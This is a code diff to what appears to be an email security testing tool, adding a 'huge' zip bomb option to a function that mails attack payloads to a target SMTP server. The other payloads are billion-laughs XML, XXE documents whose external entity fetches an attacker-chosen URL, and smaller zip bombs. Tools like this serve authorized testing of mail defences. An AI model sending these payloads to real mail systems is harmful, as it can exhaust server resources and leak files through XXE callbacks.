@@ -6,7 +6,7 @@ from email.mime.base import MIMEBase
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 
-from ..utils.decompression_payloads import BILLION_LAUGHS_XML, build_full_zip_bomb, build_minimal_zip_bomb
+from ..utils.decompression_payloads import BILLION_LAUGHS_XML, build_full_zip_bomb, build_huge_zip_bomb, build_minimal_zip_bomb
 from ..utils.helpers import *
 from ..utils.results import *
 from ..utils.registry import *
@@ -77,8 +77,9 @@ def test_zipxxe(e) -> ZipxxeResult:
     from_name = getattr(e.args, 'from_name', None) or ''
     timeout = max(5.0, getattr(e.args, 'zipxxe_timeout', 30.0))
     variants_arg = getattr(e.args, 'zipxxe_variants', None)
-    incl_zip_bomb = getattr(e.args, 'zipxxe_zip_bomb', False)
-    incl_zip_bomb_full = getattr(e.args, 'zipxxe_zip_bomb_full', False)
+    incl_zip_bomb = getattr(e.args, 'zipxxe_zip_bomb_small', False)
+    incl_zip_bomb_full = getattr(e.args, 'zipxxe_zip_bomb_medium', False)
+    incl_zip_bomb_huge = getattr(e.args, 'zipxxe_zip_bomb_large', False)
     default_variants = ['billion_laughs_attach', 'billion_laughs_body', 'xxe_zip', 'xxe_docx', 'xxe_body']
     if variants_arg:
         variants = [v.strip().lower() for v in variants_arg.split(',') if v.strip()]
@@ -88,6 +89,8 @@ def test_zipxxe(e) -> ZipxxeResult:
         variants.append('zip_bomb')
     if incl_zip_bomb_full and 'zip_bomb_full' not in variants:
         variants.append('zip_bomb_full')
+    if incl_zip_bomb_huge and 'zip_bomb_huge' not in variants:
+        variants.append('zip_bomb_huge')
 
     def _xxe_xml_template(url: str) -> str:
         return f'<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM "{url}">]>\n<document><content>&xxe;</content></document>'
@@ -219,6 +222,9 @@ def test_zipxxe(e) -> ZipxxeResult:
                 elif var_name == 'zip_bomb_full':
                     zip_data = build_full_zip_bomb()
                     raw_msg = _build_mime_with_attachment(subject, body, zip_data, 'zipbomb_full.zip', zip_test_id, 'application/zip')
+                elif var_name == 'zip_bomb_huge':
+                    zip_data = build_huge_zip_bomb()
+                    raw_msg = _build_mime_with_attachment(subject, body, zip_data, 'zipbomb-huge.zip', zip_test_id, 'application/zip')
                 else:
                     continue
                 ehlo_st, ehlo_reply = smtp.docmd('EHLO', e.fqdn or 'zipxxe-test.local')
